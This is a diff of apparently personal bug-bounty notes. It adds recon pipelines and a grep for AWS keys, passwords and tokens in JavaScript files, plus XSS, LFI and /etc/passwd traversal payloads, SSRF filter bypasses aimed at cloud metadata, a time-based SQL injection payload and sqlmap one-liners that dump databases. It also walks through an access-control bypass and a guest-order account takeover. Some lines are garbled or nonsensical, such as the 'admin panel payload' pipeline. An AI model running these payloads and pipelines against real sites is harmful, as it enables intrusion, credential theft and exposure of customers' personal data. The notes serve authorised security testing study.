@@ -29,13 +29,200 @@ smarthackerone1@gmail.com
 githubtesting049@gmail.com
 alastly38@gmail.com
 
-
+     my recon section
 place all the target in burpdsite  
+                                 1
+               subdomain enumeration
+               amass, subfinder, assetfinder and sublister
+               
+               amass
+          amass enum -asn -d tesla.com
+          amass enum [-active] [-ip] -d target
+           amass enum -d tesla.com | grep target
+        amass enum -d target.com -o /filepath/subdomains.txt
+          amass enum [-active] [-ip] -d target.com
+           amass enum -d target.com | grep target.com  # To just list subdomains
 
+               
+               subfinder 
+                subfinder -d url - active | tee -a subfinder.txt
+                subfinder -d google.com -all > subdomain.txt
+                Discover subdomains, identify JavaScript files (with HTTP response status 200), and save the results in separate files
+                subfinder -d target.com | httpx -mc 200 | tee subdomains.txt && cat subdomains.txt | waybackurls | httpx -mc 200 | grep .js | tee js.txt
 
+                cat js.txt | grep -r -E "aws_access_key|aws_secret_key|api key|passwd|pwd|heroku|slack|firebase|swagger|aws_secret_key|aws key|password ftp            password|jdbc|db|sql|secret jet|config|admin|pwd|json|gcp|htaccess|.env|ssh key|.git|access key|secret token|oauth_token|oauth_token_secret"
+                
+                sublist3r
+                pyhton sublist3r -d url -b optional
+                
+                
+               brute force subdomain
+               knock.py 
+               
+               dns for subdomain
+               dnsgen
+               echo "url" |dnsgen | tee -a dns.text
+               
+               maual subdomain enum
+               virustotal, censys,  choas
+               
+                 2
+                FILTERING OUT LIVE SUBDOMIN
+                 httpx and httprobe
+                 
+                 # Check status of urls and make new file
+                  cat all_urls.txt | httpx -mc 200 | tee live_urls.txt   
+                  cat | grep -E  (url ) | sort -u | tee -u | tee all_url.txt 
+                 httpx -l subdomains.txt -ports 80,8080,8000,8888 -threads 200 > subdomains_alive.txt
+                cat file.txt | httpx -sc
+  
+ 
+  
+                  Httprobe 
+            certspotter corp.yahoo.com | httprobe
+            httprobe $ cat output.txt | httprobe | tee -a domains
+             sort subdomain
+             sort -u subdomains.txt | httprobe > /filepath/uniq.txt  
+                 
+                 
+                 cat |grep -E *(url) | sot - u | urlsubdomain.txt
+                  //note, when give a subdomian that is in scope , you have to move stright to extraction of url
+                 
+                 3
+                 URL RECON - EXTRACTION
+                 gau, gospider, 
+                 
+                 gau
+                 echo "url" |gau | tee gau.txt
+                  cat gau.txt | grep -E [.]js | tee javascript.txt,
+                 
+              echo "url" | gau | tee gau.txt
+               cat gau.txt | grep ? | tee param.txt    
+  gau $mytarget|egrep -iv '\.json'|grep -iE '\.js'|antiburl|awk '{print $4}' | xargs -I %% bash -c 'python3 SecretFinder.py -i %% -o cli -r "$anything"'
+                  
+                 gospider    check for goSpider github
+                    
+               Gospider -s (url) --subs --js || tee gospider.txt
+              fillter files fron it
+             cat url.txt | awk "{print& 3}" | grep -E https:// | tee url.filter.txt
+                 cat gspider.txt |awk '[print$]' | grep -E url | tee gospider.txt
+                 
+                 
+                 
+                     JAVASCRIPTS FILES
+               cat param.txt | grep -E *[.]js | tee javascript.txt
+                 
+                        4 
+                 finding parameters
+                 arjun , paramspider   check github
+                 
+                 5
+                 
+                 find old url
+                 find all vulnerabulities in old url
+                 waybackurl, waybackmachine
+                 echo "url"  | waybackurl
+                 
+                 content discovery/params discovery  for bug hunting
+                  waybackurls target.com | grep "\\.js"|uniq|sort
+                 waybackurls target.com | grep "\\.js" | xargs -n1 -I@ curl -k @ | tee -a content.txt   
+                 
+                 cat domains.txt | waybackurls > urls.txt    
+                 
+                 for xss
+        waybackurls testphp.vulnweb.com | gf xss | sed 's/=.*/=/' | sort -u | tee Possible_xss.txt && cat Possible_xss.txt | output.txt
+                   
+                    echo "test.url" | waybackurls | grep "=" | tee waybackurls.txt
+                    
+                    
+                    6
+                     SORTING OUT URL 
+                    gf,
+              
+                   cat | gf redirect | tee redirect.txt 
+                   
+                   7
+               AUTOMATIC REPLACE WITH PAYLOAD
+               qsreplace .. check github
+               
+               9
+               check for contetnt discovery
+               dirb, gobuster,ffuf
+               
+               10
+               visual recon
+                    
+                 eyewitness --web -f uniq.txt -d /path_to_save_screenshots  
+               
+               11
+               google dorking
+               12
+               github doeking
+               
+               13
+               shodan dorking
+               
+               14
+               
+      Javascript Enumeration 
+        arjun
+      paramspider
+      katana 
+      hawkrawler
+      gosipder
+      
+      
+  
+      # Normal Install
+      go install github.com/hakluke/hakrawler@latest
 
+     # Single URL
+      echo https://target.com | hakrawler
 
+    # Multiple URLs
+     cat urls.txt | hakrawler
 
+     # Include subdomains
+      echo https://target.com | hakrawler -subs
+
+     # Get all subdomains of google, find the ones that respond to http(s), crawl them all
+     echo target.com | haktrails subdomains | httpx | hakrawler
+     
+      using subjs
+    $ cat urls.txt | subjs 
+   $ subjs -i urls.txt
+                
+                15
+     sensitive discovery in js files
+     SecretFinder.py
+      photon
+   
+               16
+                SUBDOMAIN TAKEOVER
+     Hostilesubruteforce
+     ruby sub-brute.rb
+     
+     sub404
+     python3 sub404.py  -f
+     
+     subjack
+     
+     bbot
+    pipx install bbot
+     bbot -t evilcorp.com -f subdomain-enum
+     bbot -t evilcorp.com -f subdomain-enum -rf passive             //passive enum
+       
+     GOOGLE DORK FOR SUBDOMAIN TAKEOVER  
+     site:"*,example.com" intext:"PAGE NOT FOUND" | intext:"project not found" | intext:"repository not found" | intext:"domain does not exist" 
+     | intext:"this page cound not be found" | intext:"404 Blog is not found" | intext:"domain name is invalid" | intext:"No settings were found for this company"
+                 
+      17
+     using nuclie
+     
+    
+   
+               
+                       
  whatweb -a 3 (url)
  ping -c 1 (ip)
 fping -g (ip)/24  
@@ -70,63 +257,6 @@ skanuvaty --target nmap.org --concurrency 16 --subdomains-file /usr/share/dnsenu
 
 
  theHarvester -d  digitalpacific.com.au -b "anubis, baidu, bing, binaryedge, bingapi, bufferoverun, censys, certspotter, crtsh, dnsdumpster, duckduckgo, fullhunt, github-code, google, hackertarget, hunter, intelx, linkedin, linkedin_links, n45ht, omnisint, otx, pentesttools, projectdiscovery, qwant, rapiddns, rocketreach, securityTrails, spyse, sublist3r, threatcrowd, threatminer, trello, twitter, urlscan, virustotal, yahoo, zoomeye"
-
-
-
-Scan each individual IP address associated with their subdomains and having the output saved to a file  &&
-CHECK FOR OPEN PORT TOOLS, PORT COMMONLY USED 80, 441, 81   &&
-Look for any services running on unusual ports or any service running on default ports which could be vulnerable (FTP, SSH, etc). Look for the version info on services running in order to determine whether anything is outdated and potentially vulnerable
-
-
-
-subdomain eneumeration
-subfinder 
-subfinder -d url - active | tee -a subfinder.txt
-subfinder -d google.com -all > subdomain.txt
-
-Discover subdomains, identify JavaScript files (with HTTP response status 200), and save the results in separate files
-subfinder -d target.com | httpx -mc 200 | tee subdomains.txt && cat subdomains.txt | waybackurls | httpx -mc 200 | grep .js | tee js.txt
-
-cat js.txt | grep -r -E "aws_access_key|aws_secret_key|api key|passwd|pwd|heroku|slack|firebase|swagger|aws_secret_key|aws key|password|ftp password|jdbc|db|sql|secret jet|config|admin|pwd|json|gcp|htaccess|.env|ssh key|.git|access key|secret token|oauth_token|oauth_token_secret"
-
-# Download all js urls and merge together and finally grep on:
-wget --no-check-certificate -i js.txt
-cat file1.js file2.js file3.js file4.js file5.js > all_js.js
-cat all_js.js | grep -r -E # Similar to the grep above...
-           RUN
-nuclei -l js.txt -t ~/nuclei-templates/exposures/ -o js_exposures_results.txt
-
-
-
-
- sublistr
-sublist3r example.com -o output ... $ cat output foo.example.com bar.example.com
- python3 sublist3r.py tesla.com
-  python3 sublist3r.py -d tesla.com -b optional 
-  
-  
-   for hidden subdomain 
-#From https://github.com/allyshka/vhostbrute
-vhostbrute.py --url="example.com" --remoteip="10.1.1.15" --base="www.example.com" --vhosts="vhosts_full.list"
-  
-  
-amass
-amass enum -asn -d tesla.com
-amass enum [-active] [-ip] -d target
-amass enum -d tesla.com | grep target
-amass enum -d target.com -o /filepath/subdomains.txt
-
-amass enum [-active] [-ip] -d target.com
-amass enum -d target.com | grep target.com  # To just list subdomains
-
-
-
-
-     BRUTEFORCE SUBDOMIAN
-     KNOCKPY TESLA.COM
-
-    dnsgen  (dns geneartor)
-    echo "url" |dnsgen| tee -a subtxt
     
     
     CENsYS
@@ -138,81 +268,20 @@ amass enum -d target.com | grep target.com  # To just list subdomains
     
     CHAOS  
     CHECK FOR github to get the api-key to run it
-    
+   
+
      
-     FILTERING OUT LIVE SUBDOMIN
-    Httpx
-    cat | grep -E  (url ) | sort -u | tee -u | tee all_url.txt 
- httpx -l subdomains.txt -ports 80,8080,8000,8888 -threads 200 > subdomains_alive.txt
-  cat file.txt | httpx -sc
-  
-  Httprobe 
-  check for also the github docs 
-  certspotter corp.yahoo.com | httprobe
-  httprobe $ cat output.txt | httprobe | tee -a domains
-    sort subdomain
-   sort -u subdomains.txt | httprobe > /filepath/uniq.txt    
-  
-  URL RECON - EXTRACTION
-  gau
-  echo "url" | gau | tee gau.txt
-  cat gau.txt | grep ? | tee param.txt    
-  gau $mytarget|egrep -iv '\.json'|grep -iE '\.js'|antiburl|awk '{print $4}' | xargs -I %% bash -c 'python3 SecretFinder.py -i %% -o cli -r "$anything"'  // no output, checkmagain later
-     
-     
-     JAVASCRIPTS FILES
-     cat param.txt | grep -E *[.]js | tee javascript.txt
-     
-     
-     
-           SORTING OUT URL 
-      gf check github for help
-      cat | gf redirect | tee redirect.txt
-     
-     
-     
-     
-     check for goSpider github
-     Gospider -s (url) --subs --js || tee gospider.txt
-     fillter files fron it
-     cat url.txt | awk "{print& 3}" | grep -E https:// | tee url.filter.txt
-     
-     
-     FIND PARAMETERS
-     PARAMSPIDER 
-     Phythn3 paramspider -d tesla.com
-     
-     ARJUN 
-      arjun  --help
-     arjun -u tesla.com
-     
-     
+       
  check  ./cruze         //cruze : a script to automate all the lazy recon flow of the hunter with the tools great people have developed.
  ./cruze.sh example.com
      
 
-      Javascript Enumeration
-      
-      # Normal Install
-go install github.com/hakluke/hakrawler@latest
-
-# Single URL
-echo https://target.com | hakrawler
-
-# Multiple URLs
-cat urls.txt | hakrawler
-
-# Include subdomains
-echo https://target.com | hakrawler -subs
-
-# Get all subdomains of google, find the ones that respond to http(s), crawl them all
-echo target.com | haktrails subdomains | httpx | hakrawler
 
   
   
   
   
-cat domains.txt | waybackurls > urls.txt           or     cat domains.txt | waybackurls > ~/Desktop/urls.txt
+
  
  pip install jsbeautifier. Then, you run it with js-beautify -o outfile.txt scripts.txt. This will output the file outfile.txt which you can easily browse through.
  
@@ -222,18 +291,10 @@ cat domains.txt | waybackurls > urls.txt           or     cat domains.txt | wayb
  onliner to extract endpoints from JS files of a given host
  ./js at my kali/scan/
  
- using subjs
- $ cat urls.txt | subjs 
-$ subjs -i urls.txt
-
-content discovery/params discovery  for bug hunting
-
- waybackurls target.com | grep "\\.js"|uniq|sort
- waybackurls target.com | grep "\\.js" | xargs -n1 -I@ curl -k @ | tee -a content.txt        //give me output
-                                       $ cat hosts.txt | gau | subjs                     // no output   check later
 
 
-
+     
+                                                  
 keywords to look for  in javascript files:pathname url:, POST, api, GET, setRequestHeader, send( (yes with just one (, as it's used when making Ajax requests!. .headers, onreadystatechange, var {xyz} = , getParameter(), parameter, .theirdomain.com, apiKey. and also postMessage, messageListener, .innerHTML, document.write(, document.cookie, location.href, redirectUrl, window.hash.
 
 
@@ -245,8 +306,7 @@ keywords to look for  in javascript files:pathname url:, POST, api, GET, setRequ
  # Only get all urls from wayback machine
 wayback_machine_downloader http://target.com -c 5 > all_urls.txt
 
-# Check status of urls and make new file
-cat all_urls.txt | httpx -mc 200 | tee live_urls.txt   
+
 
     waybackurl  (check the github usage)
     echo "url" | waybackurl
@@ -276,15 +336,8 @@ grep "\.txt"
 ~ "\.config"     
 
       
-      AUTOMATION FOR REPLACING PARAMETERS WITH PAYLOADS      
-      QSREPLACE (check github for more guidance)              also check for xss_vibes 
-      cat file.txt | qsreplace "<script>alert(1) </script>"  
-      
-      
-    
-     
-     
-     
+       
+
      Directory Bruteforcing / content discovery
      
      dirb tesla.com (wordlist)
@@ -313,35 +366,7 @@ fuff -u (url)/fuzz  -w /usr/share/wordlist/dirbuster/directory-list-2.3-medium.t
 Vhost enumeration
 fuff -u (url)  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -H "HOST:FUZZ.EXAMPLE.COM"
 gobuster vhost -u (url)  -w /usr/share/wordlist/seclists/Discovery/DNS/subdomains-top1million-20000.txt --append-domain
-     
-     
-     SUBDOMAIN TAKEOVER
-     Hostilesubruteforce
-     ruby sub-brute.rb
-     
-     sub404
-     python3 sub404.py  -f
-     
-     subjack
-     
-     bbot
-    pipx install bbot
-     bbot -t evilcorp.com -f subdomain-enum
-     bbot -t evilcorp.com -f subdomain-enum -rf passive             //passive enum
-
-   
- 
- 
- 
-./subbrute.py cloudflare.com -o cloudflare.names
-
-
- 
- ./dnsrecon.py -d securitytrails.com
- 
-
-   eyewitness --web -f uniq.txt -d /path_to_save_screenshots  
-   
+    
 
 
       whoxy.com   //asset discovery  for root domain
@@ -396,7 +421,9 @@ site:example.com -www -shop -share -ir -mfa
 
  site:example.com intext:password | passcode | intext:username | userid | user | email | credit card | SSN filetype:csv
  
- 
+  GOOGLE DORK FOR SUBDOMAIN TAKEOVER  
+     site:"*,example.com" intext:"PAGE NOT FOUND" | intext:"project not found" | intext:"repository not found" | intext:"domain does not exist" 
+     | intext:"this page cound not be found" | intext:"404 Blog is not found" | intext:"domain name is invalid" | intext:"No settings were found for this company"
  
 
 ext:php inurl:? site:example[.]com
@@ -580,7 +607,7 @@ Try to remove the (.)com and do the same thing.
 Big domains? Give spaces between them, like "target xyz" and do the 
 
 
-
+         tip
 Perform dirsearch for all subdomains
 JSParser -  for reading javascript files
 extracting links from JS file LinkFinder(https://github.com/GerbenJavado/LinkFinder) - extracting endpoints from JS files
@@ -626,6 +653,7 @@ Now you need to check if company has the page or not , if no then register as th
   
   
   
+  
   tools for subdomain 
   amass
   findomain
@@ -666,8 +694,7 @@ Now you need to check if company has the page or not , if no then register as th
    httpx
    httprobe
    
-   sorting out url
-   gf
+ 
    
   tools for  geting  way backurl
   waybackurl
@@ -717,28 +744,52 @@ Now you need to check if company has the page or not , if no then register as th
    jsfinder                   https://kacakb/jsfinder
    Lfi-space                  https://capture0x
    klyda                      https://Xeonrx       dictionary spray
- 
- 
- 
+  
+  
+  TIPS
+  
+  Scan each individual IP address associated with their subdomains and having the output saved to a file  &&
+CHECK FOR OPEN PORT TOOLS, PORT COMMONLY USED 80, 441, 81   &&
+Look for any services running on unusual ports or any service running on default ports which could be vulnerable (FTP, SSH, etc). Look for the version info on services running in order to determine whether anything is outdated and potentially vulnerable
+
+    tip
+    
+# Download all js urls and merge together and finally grep on:
+wget --no-check-certificate -i js.txt
+cat file1.js file2.js file3.js file4.js file5.js > all_js.js
+cat all_js.js | grep -r -E # Similar to the grep above...
+           RUN
+nuclei -l js.txt -t ~/nuclei-templates/exposures/ -o js_exposures_results.txt
+
+  
+  
+  
+I've stumbled upon 10+ similar issues on shopping sites that allow guest checkouts 🛒. 
+
+Many overlook these issues because they require placing an order 📦. However, some services support cash on delivery 💸 or allow you to place a cheap order and then cancel it for a refund 🔄, making it worth adding to your checklist if other prerequisites are met.
+
+Here's what to look for:
+
+1️⃣ Target app that permits guest orders without creating an account 🕵️‍♂️
+2️⃣ Target app doesn't require email verification for new account creation, or you've found an email verification bypass on sign-up 📧🔓
+
+If these prerequisites are met, you can often find target apps with a misconfiguration that lets you access a guest user's order history by creating a new account with the same email used for the guest order. 
+
+Here's how it usually goes down:
+
+1️⃣ Place an order on the site as a "Guest" and use the victim's email during checkout, e.g., victim@example.com 📩 
+2️⃣ The victim receives an email with the receipt 📧
+3️⃣ As an attacker, sign up using the email victim@example.com assuming there's no email verification 🧑‍💻
+4️⃣ Navigate to the account's order history page, and you might strike gold 🪙 by finding the previously made orders, leading to Order History and PII leaks 🔍📜
+
+Takeaways: Don't ignore workflows involving payments; you might discover workarounds like cheap payments or cash on delivery 💡💳. Test for unusual flows and be ready for pleasant surprises with some lucrative bounties         
+  
      TIP 0
      THIS IS FOR TESTING WEB APP FOR IDOR
      set up burp in browerser1
      do  a password reset in browers1
      open the password reset email in browers2 (without using burp) and copy the token
      search for your burp history (browser1) for the token. if there is, you have got yourself a nice easy account takeover
-     
-     TIP 0.1
-     5 COMMAND CAN HELP TO EASILY IDENTIFY SQL INJECTION
-     Subfinder -d target.com | tee -a domain.txt
-     cat domain.txt | httpx | tee -a url.alive.txt
-     cat url.alive.txt | waybackurls | tee - a urls.check.txt
-     gf sqli urls.check >> urls.sqli.txt         //  gf url.check >> urls.sqli.txt
-     sqlmap -m urls.sqli.txt  --dbs --batch
-
-     
-     
-     
-   
    
    
   TIPS 1
@@ -786,8 +837,8 @@ cat targets.txt  | httpx -mr "register"
 Lesson: Always test unusual login flows by logging in with a 3rd party provider without sharing email with the target site. These designs can be flawed and lead to nice bounties!
 
     
-    
       
+    IDOR
    TIP 5
   
   Here's how to successfully elevated role to an Internal admin, exposing admin functionalities, resulting in a mass PII leak and access to other sensitive Internal reports:
@@ -814,11 +865,9 @@ Lesson: Always test unusual login flows by logging in with a 3rd party provider 
 
 Takeaways: Always scrutinize critical app requests/responses for anomalies. Don't hesitate to spend an extra minute testing the basics—you might be pleasantly surprised by the results! 💡🐛💰
     
-
-
-   
+      
     tip6
-      IDOR
+      
 Here's a simple approach to spot these vulnerabilities: misconfigured object  IN  Salesforce site?
 
 1️⃣ Install this amazing tool - 🔧 https://github.com/moniik/poc_salesforce_lightning
@@ -842,11 +891,65 @@ Here's a brief methodology:
 Check out this article for details: https://web.archive.org/web/20220331095516/blog.melbadry9.xyz/dangling-dns/aws/ddns-ec2-current-state
 Here's the link to the nuclei template - https://github.com/projectdiscovery/nuclei-templates/raw/2ff27f5a024d7a8179b241931d00adc4d5d3fa93/dns/ec2-detection.yaml
 Here's the link to the start-stop script - https://github.com/adilnbabras/EC2-Start-Stop
+
+      Tip 8
+      
+     THIS IS FOR TESTING WEB APP FOR IDOR
+     set up burp in browerser1
+     do  a password reset in browers1
+     open the password reset email in browers2 (without using burp) and copy the token
+     search for your burp history (browser1) for the token. if there is, you have got yourself a nice easy account takeover
+     
+     
+     Tip 9
+     GET /admin HTTP/1.1
+   Host: http://site.com
+...
+   Access is denied
+
+   GET /test HTTP/1.1
+   Host: http://site.com
+  X-Original-URL: /admin
+ 
+   HTTP/1.1 200 OK 
+   
+    tip 10
+    
+    application allows for free and paid features
+    only able to access free features
+    clicking paid features, redirect to payment link for paid
+    forund a params as "disabled"
+    access granted to paid feature
+   
+   
+   tip 11
+   Testing authorization/access controls with a numeric ID? Try decimals/floats and round to the number you want to access.
+
+  Example:
+  admin role ID is 1
+  Try to set your ID to 0.9 and it may bypass the auth check as system will round up after auth check  and allwos check userid, credit card details,username,passwords in urls
   
+  Tip 12
+  Changing host header on password reset page to see if it's used to form part of the resulting link emailed to the user (thus leaking the one-time password reset token).  and allows check for http parameter pollution in the password reset page on the email parameter. and Signing up a account with spaces, like "admin  " and check if the app will give u access to admin account
+  //remember//
+  Response received when enabling a user functionality using password can work out with other account by entering a wrong password ( get the response of the 1st account in repeater now copy the same on the other account by do intercept - respond to this request option in burp)
+  
+  ////
+  Changing host header on password reset page to see if it's used to form part of the resulting link emailed to the user (thus leaking the one-time password reset token).
+  
+  
+  
+  
+   
+     
+     
 
 
 Xss
 check for xss cheatsheat
+
+<iframe src="%0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A%3Aalert(0)">
+
 
 
 REFLECTED
@@ -1598,6 +1701,9 @@ Origin:attacker.com/target.com
   Open any picture in another window for example: "https://peering.google.com/static/images/couch-ipad.png".
 Add one of this value at the end of the link: ("../../../../../../../etc/passwd") OR ("../../../../../../../proc/self/cmdline") OR ("../../../../../../../proc/self/stat") OR ("../../../../../../../proc/self/status").
 
+   ///////
+   found interesting param using gf tool --> send request to Intruder --> using LFI-Jhaddix wordlist -->Got LFI 
+Payload used: %2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
   
   
      //////////
@@ -1617,7 +1723,7 @@ Add one of this value at the end of the link: ("../../../../../../../etc/passwd"
     GET/smartkelvin/index.php?page=(yoururl)/page http/1.1
     
     /etc/shadow /// also use this too
-    
+    Payload: GET /assets/css///////../../../../../../../../etc/passwd  
     
     TRAVERSAL SEQUENCES STRIPPED NON-RECURSIVELY
     http://example.com/index.php?page=../../../etc/passwd
@@ -1671,29 +1777,8 @@ http://example.com/index.php?page=a/../../../../[ADD MORE]../../../../../etc/pas
 ?mod={payload}
 ?conf={payload}
 
-   
-
-        
-          BUSINESS LOGIN
-      
-      
-      
-      
-      
-      
 
 
-
-
-
-  
-  
-  
-  
-  
-  
-  
- 
 
 
     SSRF
@@ -1728,6 +1813,14 @@ http://example.com/index.php?page=a/../../../../[ADD MORE]../../../../../etc/pas
        site:https://somaiya.edu.in ext:php inurl:download.php
         https://example.com/viewimage/?url=file:///etc/passwd  ///
         https://example.com/viewimage/?url=http://169.254.169.254/latest/meta-data     // this is redirtling the file to aws/metadata
+        
+        
+        HOW TO CATCH A BLIND SSRF
+   1)    In order to validate that you can interact with internal services or applications, you can utilise “SSRF canaries”. If you receive a request to your canary host, it means that you have successfully hit an internal service that is also capable making outbound requests.
+   
+   2)    
+       
+       
        
        TIP 1
        
@@ -1802,6 +1895,15 @@ https://192.10.10.2#.192.10.10.3/
 https://192.10.10.2?.192.10.10.3/
 https://192.10.10.2\.192.10.10.3/
 https://192.10.10.3/
+
+You can embed credentials in a URL before the hostname:
+https://expected-host:fakepassword@evil-host
+https://evil-host#expected-host                 using the #character  and also check if  You can also try double-encoding characters and try the combination of all this techiniques
+
+
+
+
+
 https://ⓈⒾⓉⒺ.ⓒⓞⓜ = site.com
 <?php
 header('Location: http://127.0.0.1:8080/status');
@@ -1882,6 +1984,112 @@ header('Location: http://127.0.0.1:8080/status');
      search for whois information
      proceeded to make the API call to read AWS instance metadata (http://169.254.169.254/latest/meta-data/ 
      check for url caching works if there, try to understand how url caching works    ////  
+     
+     https://help.redacted.com/plugins/servlet/oauth/users/icon-uri?consumerUri=http://127.0.0.1:4848/theme/META-INF%2f%25c0%25ae%25c0%25ae%2f%25c0%25ae%25c0%25ae%2f%25c0%25ae%25c0%25ae%2f%25c0%25ae%25c0%25ae%2f%25c0%25ae%25c0%25ae%2f%25c0%25ae%25c0%25ae%2f%25c0%25ae%25c0%25ae%2f%25c0%25ae%25c0%25ae%2f%25c0%25ae%25c0%25ae%2f%25c0%25ae%25c0%25ae%2fetc%2fpasswd
+  
+   TIP//
+   1 — Get the alive subdomain from subfinder and send them to httpx
+
+2 — Open the burp suite, create a new project and set up your autorepeater with the above regex and settings like the above image.
+
+3 — Use Katana tool by projectdiscvery and use the proxy option and add the burp proxy URL by the default, it will be http://127.0.0.1:8080
+
+4 — Open the subdomain manually by the browser and visit every login page and any page you have seen on the target website you have.
+
+5 — Open the burp again and you will see the catch by the burp suite auto repeater extension, if there are any parameters to take an input like http://google.com it will change to your collab URL you have been replaced with in the autorepeater and if that no response send to your collab you will see that the autorepeater have saved the tested URL in it until you close the burp suite.
+
+ oneliner for the above
+ subfinder -d hackerone.com | httpx -timeout 10 | katana -proxy http://127.0.0.1:8080 -jc -aff 
+ 
+   regex for ssrf in autorepeter =  https?://(www.)?[-a-zA-Z0–9@:%.+~#=]{1,256}.[a-zA-Z0–9()]{1,6}\b([-a-zA-Z0–9()@:%+.~#?&//=]*)
+   
+   
+   
+   
+   
+   These are the top 5 obvious features I look for in a target app to find SSRF Issues:
+
+1️⃣ Export to PDF - Does your target app support generating PDFs? 📄 Try injecting HTML into the content that is used for generating that PDF. If vulnerable to HTML injection, you might strike gold by injecting HTML/JS.💰
+
+2️⃣ Integrations - If your target app supports web hook Integration feature, replace the URL with your Burp Collab and wait for a hit. 🔄
+
+3️⃣ Import via link Feature - Does your target app support importing files or websites via a link? 📥 Specify your attacker Burp Collab and check for a hit, especially when uploading profile pictures or media through a library.
+
+4️⃣ Host Header - Test for Routing-based SSRF by supplying your Collaborator server domain in the Host header. If you receive a DNS lookup from the target server, you might be able to route requests to arbitrary domains🌐
+
+5️⃣ File Upload - Does your target app support uploading files? 📂 Try uploading an HTML file; if rendered and executed on the server-side, you might strike gold. No luck? Try an SVG with SSRF payload. If that fails, move on to the next!
+   
+   
+  
+   
+   
+   //////
+    never forgot to look into JavaScript files, as it is possible to get new endpoints from them.
+   
+   
+   
+   
+   SSRF IN DNS REBRINDING
+  set dns rebrinding to   127.0.0.1/google ip  or any other bypass and send many request with burp intruder and watch response that come back different lenght than others
+  check if it is an aws metadata IP and try to  retrieve data from there by firing up burp intruder
+  
+
+
+   
+   TIPS 3
+I've stumbled upon 10+ similar issues on shopping sites that allow guest checkouts 🛒. 
+
+Many overlook these issues because they require placing an order 📦. However, some services support cash on delivery 💸 or allow you to place a cheap order and then cancel it for a refund 🔄, making it worth adding to your checklist if other prerequisites are met.
+
+Here's what to look for:
+
+1️⃣ Target app that permits guest orders without creating an account 🕵️‍♂️
+2️⃣ Target app doesn't require email verification for new account creation, or you've found an email verification bypass on sign-up 📧🔓
+
+If these prerequisites are met, you can often find target apps with a misconfiguration that lets you access a guest user's order history by creating a new account with the same email used for the guest order. 
+
+Here's how it usually goes down:
+
+1️⃣ Place an order on the site as a "Guest" and use the victim's email during checkout, e.g., victim@example.com 📩 
+2️⃣ The victim receives an email with the receipt 📧
+3️⃣ As an attacker, sign up using the email victim@example.com assuming there's no email verification 🧑‍💻
+4️⃣ Navigate to the account's order history page, and you might strike gold 🪙 by finding the previously made orders, leading to Order History and PII leaks 🔍📜
+
+Takeaways: Don't ignore workflows involving payments; you might discover workarounds like cheap payments or cash on delivery 💡💳. Test for unusual flows and be ready for pleasant surprises with some lucrative bounties 
+   
+   
+   tips 
+   
+
+   Bypass #SSRF filters by using http://127.1 instead of http://127.0.0.1
+  It resolves to the same but confuses filters blocking localhost/127.0.0.1 specifically!  and also remember that 
+      file:///etc/passwd : Not authorized
+      file://\/\/etc/passwd : Work 😀
+      
+      tips
+      using wordlistgen
+      go get -u github.com/ethicalplayground/wordlistgen
+      
+      cat "https://example.com" | getjs -complete | ./wordlistgen -p param.txt -d"www.example.com" | tee wordlist.txt
+      
+      //replace variables with payload and always change payload with ssrf payload
+      
+      cat wordlist.txt | qsreplace http://127.0.0.1/admin | tee -a host.txt 
+      
+      use httpx to keep track of the code
+      cat hosttxt | httpx -title -status-code
+      
+      
+      
+       
+      
+      
+      
+      
+      
+   
+  
+  
   
   
   
@@ -1930,11 +2138,35 @@ header('Location: http://127.0.0.1:8080/status');
        
        
        
-    
- sql injection
- 
- SQL Injectjon for Contact/Registration Forms .
+       
+       
+       
 
+     5MIN ADMIN PANEL ACCESSED PAYLOAD
+cat urls.txt | qsreplace "?admin=true" | gau | phpgcc | anew | kxss | awk  -v  -q txt | sed 's/http/\nhttp/g' | grep ^http | sed 's/\(^http[^ <]*\)\(.*\)/\1/g' | grep -vi -e dalfox -e lElLxtainw| sort -u | waybackurls
+    
+ 
+ SQL INJECTION
+ 
+   5 COMMAND CAN HELP TO EASILY IDENTIFY SQL INJECTION
+     Subfinder -d target.com | tee -a domain.txt
+     cat domain.txt | httpx | tee -a url.alive.txt
+     cat url.alive.txt | waybackurls | tee - a urls.check.txt
+     gf sqli urls.check >> urls.sqli.txt         //  gf url.check >> urls.sqli.txt
+     sqlmap -m urls.sqli.txt  --dbs --batch
+ 
+ 
+ 
+ 
+ 
+ payload 
+ 14)%20AND%20(SELECT%207415%20FROM%20(SELECT(SLEEP(10)))CwkU)%20AND%20(7515=7515
+ 
+ 
+ SQL injection Oneliner.
+ subfinder -dL domains.txt | dnsx | waybackurl | uro | grep "\?" | head -20 | httpx -silent > urls;sqlmap -m urls --batch --random-agent --level 1 | tee sqlmap.txt
+
+ SQL Injectjon for Contact/Registration Forms .
 1. sqlmap -u http://target.com/registration --dbs --forms --crawl=2
 2. it will crawl all the links having input field
 3. select the parameter you want to test
